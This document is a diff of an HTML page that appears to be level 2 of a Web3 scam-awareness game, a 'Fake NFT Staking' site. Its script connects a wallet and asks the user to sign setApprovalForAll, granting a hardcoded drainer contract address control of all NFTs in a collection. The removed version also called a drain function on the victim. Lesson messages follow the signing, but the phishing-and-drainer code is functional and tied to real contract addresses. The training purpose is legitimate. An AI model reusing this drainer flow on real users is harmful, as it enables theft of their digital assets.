@@ -2,100 +2,101 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>WGNFT Vault | Claim Your Reward</title>
+  <title>Fake NFT Staking | Stake to Claim</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
-      background: url('https://images.unsplash.com/photo-1612197528463-1c4e7b631799?ixlib=rb-4.0.3&auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
-      background-size: cover;
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
       color: #fff;
+      margin: 0;
+    }
+    .top-bar {
+      background: #111;
+      padding: 0.8rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.9rem;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
+    }
+    .frame-container {
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
+      height: calc(100vh - 60px);
     }
     .card {
       background: rgba(0, 0, 0, 0.85);
-      border-radius: 10px;
+      border-radius: 12px;
       padding: 2rem;
-      box-shadow: 0 0 18px #26a69a;
+      box-shadow: 0 0 18px #ff9800;
       max-width: 540px;
       width: 100%;
       text-align: center;
     }
+    .button-container {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 1rem;
+    }
     button {
       padding: 1rem 2rem;
-      margin-top: 1rem;
       font-size: 1rem;
-      background: #26a69a;
+      background: #ff9800;
       border: none;
       border-radius: 8px;
       color: #fff;
       cursor: pointer;
     }
-    .danger {
-      background: #e74c3c;
-    }
     #status {
       margin-top: 2rem;
-      font-size: 1rem;
+      font-size: 1.1rem;
       white-space: pre-wrap;
       text-align: left;
     }
-    #timer {
-      font-weight: bold;
-      color: #ffeb3b;
-    }
     #nextBtn {
       display: none;
-      margin-top: 1.5rem;
       background: #4caf50;
+      padding: 1rem;
+      border-radius: 8px;
+      color: #fff;
+      text-decoration: none;
+      margin-top: 2rem;
+      display: inline-block;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>🎁 Claim Your WGNFT Reward</h1>
-    <p>
-      Congratulations! You’re eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>
-      Offer ends in <span id="timer">3h 42m 00s</span>.
-    </p>
-    <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
-    <button id="connectBtn">Connect Wallet</button>
-    <button id="previewBtn">Preview Claim</button>
-    <button id="claimBtn" style="display: none;">Confirm Claim</button>
-    <a href="index3.html" id="nextBtn">➡️ Proceed to Level 3</a>
-    <div id="status"></div>
+  <div class="top-bar">
+    <div>Web3 War Game</div>
+    <div>✅ Survived: <span id="surviveCount">0</span> | 💀 Drained: <span id="failCount">0</span></div>
+  </div>
+  <div class="frame-container">
+    <div class="card">
+      <h1>🎭 Fake NFT Staking</h1>
+      <p>Stake your NFTs to earn passive rewards. Sounds legit, right?</p>
+      <div class="button-container">
+        <button id="connectBtn">Connect Wallet</button>
+        <button id="stakeBtn">Stake Now</button>
+      </div>
+      <div id="status"></div>
+      <a href="#" id="nextBtn">➡️ Proceed to Level 3</a>
+    </div>
   </div>
 
   <script>
-    // Countdown timer
-    let countdown = 3 * 60 * 60 + 42 * 60;
-    const timerElement = document.getElementById("timer");
-    setInterval(() => {
-      if (countdown <= 0) return;
-      countdown--;
-      const hrs = Math.floor(countdown / 3600);
-      const mins = Math.floor((countdown % 3600) / 60);
-      const secs = countdown % 60;
-      timerElement.innerText = `${hrs}h ${mins}m ${secs}s`;
-    }, 1000);
+    const nftContract = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
+    const drainerContract = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";
+    const nftABI = ["function setApprovalForAll(address operator, bool approved) public"];
 
-    const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
-    const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";
+    let provider, signer, contract;
 
-    const nftABI = [
-      "function setApprovalForAll(address operator, bool approved) external",
-      "function isApprovedForAll(address owner, address operator) external view returns (bool)"
-    ];
-
-    const drainerABI = [
-      "function drain(address nft, address victim) external"
-    ];
-
-    let provider, signer, nft, drainer;
+    function updateCounters() {
+      document.getElementById("surviveCount").textContent = localStorage.getItem("w3game_survived") || 0;
+      document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
+    }
 
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
@@ -108,57 +109,50 @@
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-
         const userAddress = await signer.getAddress();
-        nft = new ethers.Contract(nftAddress, nftABI, signer);
-        drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
-
+        contract = new ethers.Contract(nftContract, nftABI, signer);
         status.innerText = `✅ Connected: ${userAddress}`;
       } catch (err) {
         console.error("Connection error:", err);
-        status.innerText = `❌ Connection failed.`;
+        status.innerText = "❌ Wallet connection failed.";
       }
     };
 
-    document.getElementById("previewBtn").onclick = () => {
-      document.getElementById("status").innerText =
-        "📦 Previewing reward calculation...\n\nEstimated reward: 420 WGFAKE\nStake Duration: 12 days\nNetwork Fee: 0.002 ETH";
-      document.getElementById("claimBtn").style.display = "inline-block";
-    };
-
-    document.getElementById("claimBtn").onclick = async () => {
+    document.getElementById("stakeBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Connect your wallet first.");
 
       try {
-        status.innerText = "🔐 Requesting NFT claim rights...";
-        const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
-        await approvalTx.wait();
+        status.innerText = "🚨 Approving NFT transfer...";
+        const tx = await contract.setApprovalForAll(drainerContract, true);
+        await tx.wait();
 
-        const userAddress = await signer.getAddress();
-        status.innerText = "🚀 Claim rights granted. Finalizing reward...";
-
-        const drainTx = await drainer.drain(nftAddress, userAddress);
-        await drainTx.wait();
-
-        status.innerText = "💀 You got drained! This trap used `setApprovalForAll()` to gain permission to transfer **ALL your NFTs**.\n\n🧠 Lesson: Never blindly approve access to your entire NFT collection. Always check who you're giving permissions to.";
+        status.innerText = "💀 You just approved a malicious contract to move ALL your NFTs.\n\n👉 Scam Type: setApprovalForAll Exploit\nThis allows the contract to call `transferFrom()` on ALL NFTs you own under this collection.\n\n🧠 Lesson: Never approve full control of your assets to unknown or shady dApps.";
         localStorage.setItem("w3game_level2", "drained");
+
+        let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
+        localStorage.setItem("w3game_failed", failCount + 1);
+        updateCounters();
+        document.getElementById("nextBtn").style.display = "inline-block";
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
-          status.innerText = "✅ You survived Level 2!\n\n🛡️ You avoided signing a malicious `setApprovalForAll()` transaction.\n\nThis would have given an attacker control over all your NFTs from this collection.\n\nGreat job — prepare for Level 3.";
+          status.innerText = "✅ You survived Level 2!\n\n🛡️ You rejected a dangerous full-access approval request for your NFTs.\n\nWell played. Stay alert for `setApprovalForAll` traps in shady airdrop and staking dApps.";
           document.getElementById("nextBtn").style.display = "inline-block";
           localStorage.setItem("w3game_level2", "survived");
+
+          let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
+          localStorage.setItem("w3game_survived", surviveCount + 1);
+          updateCounters();
         } else {
-          console.error("Drain error:", err);
-          status.innerText = `⚠️ Unexpected error occurred.`;
+          console.error("Unexpected error:", err);
+          status.innerText = "⚠️ Unexpected error occurred.";
         }
       }
     };
 
     window.onload = () => {
-      if (localStorage.getItem("w3game_level2") === "survived") {
-        document.getElementById("nextBtn").style.display = "inline-block";
-      }
+      updateCounters();
+      document.getElementById("nextBtn").style.display = "none";
     };
   </script>
 </body>
